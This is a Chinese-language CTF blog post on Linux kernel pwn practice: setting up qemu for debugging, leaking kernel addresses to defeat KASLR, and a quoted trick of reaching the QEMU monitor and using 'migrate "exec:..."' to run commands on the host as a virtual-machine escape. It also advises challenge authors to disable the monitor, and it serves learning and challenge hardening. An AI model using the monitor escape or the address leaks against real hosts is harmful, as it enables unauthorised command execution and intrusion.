---
layout: post
tags: [kernel_pwn]
title: "kernel security 2: ptracticing"
author: wsxk
date: 2025-9-16
comments: true
---

- [1. kernel 环境搭建](#1-kernel-环境搭建)
  - [1.1 自安装](#11-自安装)
  - [1.2 一键式脚本](#12-一键式脚本)
  - [1.3 kernel debug](#13-kernel-debug)
- [获取kernel地址的方法:](#获取kernel地址的方法)
- [特典: kernel pwn tricks:](#特典-kernel-pwn-tricks)
  - [特典一：qemu monitor模式](#特典一qemu-monitor模式)


# 1. kernel 环境搭建<br>
kernel环境搭建需要4个部分:<br>
```
1. 编译器compiler： gcc，用于编译内核模块和内核
2. 内核 kernel： 无需多言，内核elf文件
3. 文件系统 filesystem： 用于存储，有了它，内核才可以存放各种文件。
4. 模拟器 emulator： 多数情况下指的是qemu，用于模拟执行内核
```
## 1.1 自安装<br>
可参考我22年左右写的blog，[https://wsxk.github.io/ubuntu_kernel%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/](https://wsxk.github.io/ubuntu_kernel%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/)<br>
自己安装是非常复杂的操作.<br>

## 1.2 一键式脚本<br>
pwn.college提供了一键式脚本:<br>
[https://github.com/pwncollege/pwnkernel/tree/main](https://github.com/pwncollege/pwnkernel/tree/main)<br>
直接运行即可，方便快捷~<br>
考虑到仓库的更新时间，使用ubuntu22虚拟机会是个比较好的选择。<br>

## 1.3 kernel debug<br>
内核问题通常涉及到需要编写c代码并编译成静态可执行程序，然后打包进内核的文件系统中，才能执行。这样有一个问题，**每次重新编写exp时，就要关闭内核，将exp打包进文件系统，再启动内核**,太麻烦了，有一种解决办法<br>
```
/usr/bin/qemu-system-x86_64 \
	-kernel linux-5.4/arch/x86/boot/bzImage \
	-initrd $PWD/initramfs.cpio.gz \
	-fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \     #关键1
	-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \    #关键2
	-nographic \
	-monitor none \
	-s \
	-append "console=ttyS0 nokaslr"
```
关键1和关键2两个参数相当于把宿主机的`$HOME`目录挂载到来宾机的`$HOME`目录下，这样我们在宿主机上编写程序后就可以快速开始调试，节省时间:<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250831103629.png)

kernel调试的理想条件：<br>
```
1. kernel携带debug symbols，即可以 b commit_creds直接下断点
2. kaslr关闭，即每次启动kernel的地址空间没有变化，方便调试
```


# 获取kernel地址的方法:<br>
对于开启了kaslr的题目，想办法获取kernel地址是非常重要的：<br>
```
1. cat /proc/kallsym
2. cat /proc/modules
3. cat /sys/module/xxxx/sections/.text 
4. 如果你能造成内核panic的话，打印报错信息时的r11寄存器就是内存地址
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250827195452.png)

# 特典: kernel pwn tricks:<br>
这些特典或许不能帮助我们理解kernel，但是可以帮助我们ctf题目中快速拿分！<br>
## 特典一：qemu monitor模式<br>
`QEMU monitor` 是 QEMU 内置的一个交互式控制台窗口，主要用于监控和管理虚拟机的状态。由于 Linux kernel pwn 题目通常使用 QEMU 创建虚拟机环境，因此若是未禁止选手对 QEMU monitor 的访问，则选手可以直接获得整个虚拟机的访问权限。同时，由于 QEMU monitor 支持在 host 侧执行命令，因此也可以直接读取题目环境中的 flag，这同时意味着我们还能可以利用 QEMU monitor 完成虚拟化逃逸。<br>
***对于出题人而言，应当时刻保证 QEMU 的参数包含一行 -monitor none 或是 -monitor /dev/null 以确保选手无法访问 QEMU monitor。***<br>
通常情况下，进入 QEMU monitor 的方法如下:<br>
```
1. 首先同时按下 CTRL + A
2. 接下来按 C
```
使用 pwntools 脚本时，可以通过发送 `"\x01c"` 完成，例如：<br>
```python
p = remote("localhost", 11451)
p.send(b"\x01c")
```
在 QEMU monitor 当中有一条比较好用的指令叫做`migrate`，其支持我们执行特定的 URI：<br>
```
(qemu) help migrate
migrate [-d] [-r] uri -- migrate to URI (using -d to not wait for completion)
                         -r to resume a paused postcopy migration
```
其中，**`URI 可以是 'exec:<command>' 或 tcp:<ip:port>`**，前者支持我们直接在宿主机上执行命令，例如下面的命令在宿主机上执行了 ls 命令：<br>
```
migrate "exec: sh -c ls"
```
有的时候可能会由于一些特殊原因遇到没有输出的情况，这个时候可以尝试将 stdout 重定向至 stderr，例如：
```
(qemu) migrate "exec: whoami"
qemu-system-x86_64: failed to save SaveStateEntry with id(name): 2(ram): -5
qemu-system-x86_64: Unable to write to command: Broken pipe
qemu-system-x86_64: Unable to write to command: Broken pipe
(qemu) migrate "exec: whoami 1>&2"
arttnba3
qemu-system-x86_64: failed to save SaveStateEntry with id(name): 2(ram): -5
qemu-system-x86_64: Unable to write to command: Broken pipe
qemu-system-x86_64: Unable to write to command: Broken pipe
(qemu) 
```

[https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/tricks/qemu-monitor/](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/tricks/qemu-monitor/)<br>



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>